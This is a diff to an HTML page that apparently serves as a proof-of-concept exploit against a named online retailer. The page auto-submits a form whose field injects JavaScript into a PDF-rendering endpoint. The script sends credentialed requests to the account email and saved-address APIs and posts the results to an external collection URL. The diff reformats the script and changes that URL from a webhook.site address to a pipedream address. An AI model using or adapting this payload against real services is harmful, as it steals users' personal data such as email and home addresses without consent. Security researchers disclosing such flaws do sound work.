@@ -2,7 +2,29 @@
 <html>
 <body>
 <form id="f" action="https://pdf.shein.com/html" method="POST">
-<input name="content" value='<script>var w="https://webhook.site/afa8e098-cdf4-4c25-8230-2abe0bddd66f";var a=new XMLHttpRequest();a["open"]("POST","https://eur.shein.com/bff-api/user-api/addressbook/getAccountAndOrderEmail?_ver=1.1.8&_lang=en");a.withCredentials=true;a.onload=function(){var y=new XMLHttpRequest();y["open"]("POST",w);y.send("EMAIL: "+a.responseText)};a.send();var b=new XMLHttpRequest();b["open"]("GET","https://eur.shein.com/bff-api/address/address_list?_ver=1.1.8&_lang=en&scene=&isSiteLimit=1");b.withCredentials=true;b.onload=function(){var z=new XMLHttpRequest();z["open"]("POST",w);z.send("ADDRESS: "+b.responseText)};b.send()</script>'>
+<input name="content" value='<script>
+var w="https://eondm3hfjar18nj.m.pipedream.net";
+
+var a=new XMLHttpRequest();
+a.open("POST","https://eur.shein.com/bff-api/user-api/addressbook/getAccountAndOrderEmail?_ver=1.1.8&_lang=en");
+a.withCredentials=true;
+a.onload=function(){
+    var y=new XMLHttpRequest();
+    y.open("POST",w);
+    y.send("EMAIL: "+a.responseText);
+};
+a.send();
+
+var b=new XMLHttpRequest();
+b.open("GET","https://eur.shein.com/bff-api/address/address_list?_ver=1.1.8&_lang=en&scene=&isSiteLimit=1");
+b.withCredentials=true;
+b.onload=function(){
+    var z=new XMLHttpRequest();
+    z.open("POST",w);
+    z.send("ADDRESS: "+b.responseText);
+};
+b.send();
+</script>'>
 </form>
 <script>document.getElementById("f").submit();</script>
 </body>
